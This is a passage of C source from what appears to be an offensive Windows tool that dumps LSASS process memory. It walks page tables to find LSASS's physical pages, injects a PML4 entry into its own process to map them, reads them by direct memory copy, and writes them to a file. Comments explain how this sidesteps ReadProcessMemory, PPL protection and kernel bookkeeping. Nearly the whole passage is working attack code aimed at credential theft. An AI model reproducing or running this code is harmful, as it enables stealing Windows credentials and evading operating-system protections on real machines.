        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32 me = {sizeof me};
            if (Module32First(snap, &me))
                lsass_base = (uint64_t)(uintptr_t)me.modBaseAddr;
            CloseHandle(snap);
        }
        if (!lsass_base) {
            printf("[!] Module snapshot failed (PPL?) — heuristic base 0x7FF000000000\n");
            lsass_base = 0x7FF000000000ULL;
        }
        printf("[*] LSASS image base = 0x%016"PRIX64"\n", lsass_base);

        /* find_user_dtb probes +0x028 first, then UDTB candidates.
         * On KPTI (Hyper-V guest): +0x028 is kernel-only CR3, user VAs
         * resolve to 0 → we fall through to UDTB offsets automatically. */
        printf("[*] Finding LSASS user CR3 (KPTI-aware)...\n");
        uint64_t lsass_cr3 = find_user_dtb(lsass_pa, lsass_base);
        if (!lsass_cr3) {
            printf("[-] LSASS user DTB not found — all CR3 candidates fail\n");
            return 1;
        }

        printf("[*] Walking LSASS page tables (16 pages)...\n");
        n_target = collect_pages(lsass_cr3, lsass_base, target_pas, 16);
        if (!n_target) {
            printf("[-] No LSASS pages resolved\n");
            printf("    SLAT may be blocking page-table reads even without VBS.\n");
            printf("    Try: cr3_inject2.exe <known_lsass_PA_hex> to map a specific page.\n");
            return 1;
        }
        printf("[+] Collected %d pages\n\n", n_target);
    }

    /* ── Inject ─────────────────────────────────────────────────────────── */
    printf("[*] Building PT chain and injecting PML4 entry...\n");
    PmlInject inj;
    if (!pml_inject(&inj, own_eproc_pa, target_pas, n_target)) {
        printf("[-] Injection failed\n");
        return 1;
    }
    printf("[+] Injection complete — %u pages mapped at VA 0x%016"PRIX64"\n\n",
           inj.n_pages, inj.map_va_base);

    /* ── Read ────────────────────────────────────────────────────────────── */
    printf("[*] Reading from mapped VA (direct dereference — zero kernel involvement)...\n");

    /*
     * WHY direct memcpy, NOT ReadProcessMemory:
     *
     * ReadProcessMemory → NtReadVirtualMemory → MmProbeAndLockPages.
     * MmProbeAndLockPages inspects the PFN database for the physical pages
     * we mapped. Those pages belong to LSASS's working set; seeing them
     * referenced from our address space with no VAD entry is an inconsistency
     * → BSOD (MEMORY_MANAGEMENT / BAD_POOL_CALLER).
     *
     * Direct memcpy stays entirely in ring-3. The CPU's hardware page-table
     * walker resolves the injected PML4 entry without any kernel code running.
     * No VAD check, no PFN lock, no working-set bookkeeping. Zero BSOD risk.
     *
     * If the injection silently failed, this AV-crashes the process —
     * a clean exit, not a BSOD.
     */
    uint8_t preview[64];
    memcpy(preview, (void *)(uintptr_t)inj.map_va_base, 64);
    int read_ok = 1;

    printf("\n[+] SUCCESS — LSASS physical memory via injected PML4 (zero syscall):\n    ");
    for (int i = 0; i < 64; i++) {
        printf("%02x ", preview[i]);
        if ((i & 15) == 15 && i < 63) printf("\n    ");
    }
    printf("\n");

    if (preview[0] == 'M' && preview[1] == 'Z')
        printf("\n[+] MZ header confirmed — reading lsass.exe image\n");

    if (argc < 2) {
        printf("\n[*] Dumping %u pages (%u KB) to lsass_inject.bin...\n",
               inj.n_pages, inj.n_pages * 4);
        FILE *f = fopen("lsass_inject.bin", "wb");
        if (f) {
            for (uint32_t pg = 0; pg < inj.n_pages; pg++) {
                uint8_t page[4096];
                memcpy(page,
                       (void *)(uintptr_t)(inj.map_va_base + (uint64_t)pg * 0x1000),
                       4096);
                fwrite(page, 1, 4096, f);
            }
            fclose(f);
            printf("[+] Saved lsass_inject.bin\n");
        }
    }

    /* ── Cleanup ─────────────────────────────────────────────────────────── */
    printf("\n[*] Removing injection...\n");
    pml_remove(&inj);
    printf("[+] Done.\n");

    return read_ok ? 0 : 1;
}
